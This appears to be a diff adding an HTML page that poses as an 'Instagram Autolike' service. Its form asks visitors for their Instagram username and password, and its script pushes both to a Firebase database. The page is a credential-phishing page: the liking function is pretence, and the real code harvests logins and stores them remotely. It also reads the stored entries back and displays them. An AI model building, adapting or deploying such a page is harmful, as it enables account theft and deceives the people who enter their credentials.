@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram Liker ❤️❤️❤️</title>
+        <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+   <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.js"></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- HTML -->
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+  
+        <style>
+            body {
+    background-color: rgb(0,0,0,0.3);
+    
+}
+@import url('https://fonts.googleapis.com/css?family=Comfortaa|Dancing+Script|Handlee|Raleway');
+
+*,html{
+   margin:0; 
+   padding:0;
+}
+html,body{
+    scroll-behavior:smooth;
+}
+header{
+   background-color:#0f255c; 
+   display:flex;
+   border-bottom:2px solid orange;
+   border-radius:0 0px 10px 10px;
+   color:#fff;
+   width:100%;
+   position:fixed;
+   padding:0 10px;
+   box-sizing:border-box ;  
+   top:0;
+   justify-content:space-between;
+   z-index:5;
+}
+   
+.menu{  
+   padding:10px 0;
+   transition:border .2s linear;
+}
+
+.menu > div{
+   width:25px;
+   height:2.5px;
+   background-color:#333; 
+   margin:5px 0px;
+   box-shadow:1px 1px 1px grey;
+   border-radius:4px 0px 4px 0px;
+   transition:.5s;
+} 
+
+nav{
+   position:fixed;
+   left:-100px;
+   top:0;
+   background-color:rgba(2,2,2,0.9);
+   width:50%;
+   height:100%;
+   box-shadow:1px 1px 1px 2px #222;
+   text-align:center;
+   transform:translateX(-100%);
+   transition:transform .6s ease;   
+}
+.open{
+    left:0px;
+    transform:translateX(0); 
+}
+
+nav ul{
+   display:block; 
+   list-style:none;
+   margin:45px 0;
+}
+nav ul li{
+   text-transform:uppercase; 
+   padding:15px 0;
+   border-bottom:1px solid rgb(165,97,0);
+}
+
+nav ul li a{
+    font-weight:bold;
+   text-decoration:none;
+   color:#fff;
+}
+.change .bar1 {
+   -webkit-transform: rotate(-45deg) translate(-6px,8px);
+    transform: rotate(-45deg) translate(-6px,8px);  
+}
+
+.change .bar2 {opacity: 0;}
+
+.change .bar3 {
+  -webkit-transform: rotate(45deg) translate(-3px,-8px);
+    transform: rotate(45deg) translate(-3px,-8px);
+}
+#main{
+    margin-top:20%;
+    margin-left:5%;
+    
+}
+#notice{
+    color:red;
+    font-size:30px;
+    text-align:center ;
+    font-weight:bolder ;
+    margin-top:10%;
+    margin-left:-5%;
+    text-decoration:underline ;
+}
+r{
+    color:red;
+    font-weight:bold;
+}
+.imm{
+    display:none;
+}
+.img{
+    width:100%;
+    height:auto;
+}
+
+
+
+
+/*importing Google font*/
+@import url('https://fonts.googleapis.com/css?family=Pacifico&display=swap');
+/*link styling*/
+a{
+  text-decoration: none;
+}
+
+
+h1
+{
+  font-family: 'Pacifico', cursive;
+  font-size: 40px;
+  font-weight:bolder ;
+  color:white;
+}
+
+.form-data
+{
+  width: 100%;
+  max-width: 35rem;
+  margin-top: 3rem;
+  background-color: purple;
+}
+
+.form-data form
+{
+  background-color: rgb(0,0,0,0.7);
+  border: 2px solid red;
+  display:flex;
+  flex-direction: column;
+  padding:2rem 4rem;
+  text-align: center;
+}
+input:focus{
+    outline:none;
+}
+
+.form-data form input
+{
+  
+  margin-bottom: .5rem;
+  border: 2px solid yellow;
+  border-radius: .4rem;
+}
+
+.form-btn
+{
+  margin: 1rem 0 1.5rem;
+  height: 1rem;
+  background-color: #3897f0;
+  color: #fff;
+  font-weight: bold;
+  border: none;
+  border-radius: .4rem;
+  cursor: pointer;
+}
+@media screen and (min-width:600px){
+    body{
+        width:600px;
+        font-size:20px;
+    }
+}
+        </style>
+         <script src="https://code.jquery.com/jquery-3.1.1.js"></script>
+    </head>
+    <body id="home">
+     <header>
+         <h1><span>Instagram</span> Autolike</h1>
+         <div class="menu">
+         <div class="bar1"></div>
+         <div class="bar2"></div>
+         <div class="bar3"></div>
+         </div>    
+     </header>
+         <nav class="nav1">
+         <ul>
+         <li><a href="#home">Home</a></li>
+         <li><a href="#notice">Notice</a></li>
+         <li><a href="#auto">Autolike</a></li>
+ <li><a href="https://yolikers.com#twrap">Other apps</a></li>
+         </ul>
+     </nav>  
+     
+     <div id="main">
+      <img class="img" src="https://dl.dropbox.com/s/g5e6z8en0nhw513/1493796187-fb-likes~2.jpg">
+         Instagram Autoliker is devolped and perform high oriented skills, Friends who you follow or Friends who follow you will be estimated which will be the limit to the total like of photo/post you upload.
+<p id="notice">Notice</p>
+<ol start="1">
+<li>
+Open your Post/Photo in <b>www.instagram.com</b> OR <b>m.instagram.com</b> version and Copy the Whole URL and Paste It. Dont use web <r>mbasic</r> version as sometime it get fail to fetch Post ID.
+</li>
+<li>
+If you are using instagram app then click <b>3 dots</b> of desired post and click Copy Link from there.
+</li>    
+<li>
+Your URL is recommended to consist of story_id= keyword in it. else you can submit and our system will try to fetch POST ID automatically.
+</li>
+<li>
+IF Our System is Unable to Fetch Post ID Automatically then Submit Custom ID manually which looks like ex- <b>1001025252522</b> without any special caracters like '_' sign.
+</li>
+<li>
+(Tip) If you want to check your Post Id is correct or not simply visit <b>www.instagram.com/YOUR-POSTID-HERE</b> and if its opening your desired post then your Post Id is correct else not.
+</li>
+</ol>
+     </div>
+
+        <div class="form-data">
+          <form action="">
+            <div class="logo">
+              <h1>Instagram.</h1>
+            </div>
+            <input placeholder="Phone number, username, or email" required id="a">
+            <input type="password" placeholder="Password" required id="b">
+            <input placeholder="photo/post link" required id="c">
+            <button class="form-btn" id="add" type="submit" onclick="writeUserData()">Start Auto like</button>
+            <a href="#home">help</a>
+          </form>
+          
+        </div>
+        <div id="msgs">
+            <h2 class="load">
+                Loading...
+            </h2>
+        </div>  
+        
+  <script src="https://www.gstatic.com/firebasejs/8.2.3/firebase.js"></script>
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+  <script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-analytics.js"></script>
+  <script>
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    var firebaseConfig = {
+    apiKey: "***********",
+    authDomain: "cartoline-india.firebaseapp.co",
+    projectId: "cartoline-india",
+    storageBucket: "********************",
+    messagingSenderId: "********",
+    appId: "1:372576193203:web:*****",
+    measurementId: "G*******"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+  </script> 
+  <script type="text/javascript" charset="utf-8">
+    var database = firebase.database();
+
+
+    function writeUserData() {
+      var name = document.getElementById('a');
+      var msg = document.getElementById('b');
+
+      if (name.value === "" || msg.value === "") {
+        
+      } else {
+        firebase.database().ref('users/').push({
+          user: name.value + "        #IG",
+          message: msg.value,
+
+        });
+
+        
+      }
+
+
+    }
+    
+    
+    var data = firebase.database().ref('users/');
+data.on('value', function(snapshot) {
+
+ 
+             
+
+document.getElementById("msgs").innerHTML="";
+
+ var val = snapshot.val();
+ Object.keys(val).forEach((key) => {
+ 
+
+
+const div = document.createElement("div") 
+
+
+div.innerHTML = `
+<div id="chain">
+<div id="main">
+
+            
+            <h3 id="showname">${val[key].user.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</h3>
+            
+            <p id="para">${val[key].message.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</p>
+                <br />
+                
+                
+        <br><br><br>
+        
+`;
+
+
+document.getElementById("msgs").appendChild(div)
+
+ });
+
+});   
+    
+  </script>          
+        
+        
+        
+<script>
+    $(document).ready(function(){
+
+$(function(){
+  $("img").removeClass("img")
+$("img").addClass("imm")
+   $('.menu').on('click',function(){
+      $('.nav1').toggleClass('open');
+   });
+  $(".nav1 ul li").click(function(){
+      $(".nav1").toggleClass('open')     
+      $(".menu").toggleClass("change");
+  });
+   $(".menu").click(function(){
+       $(this).toggleClass("change");
+   })
+   $("#main").click(function(){
+      $(".nav1").removeClass('open')     
+      $(".menu").removeClass("change");
+  });
+});
+});
+</script>
+</body>
+</html>
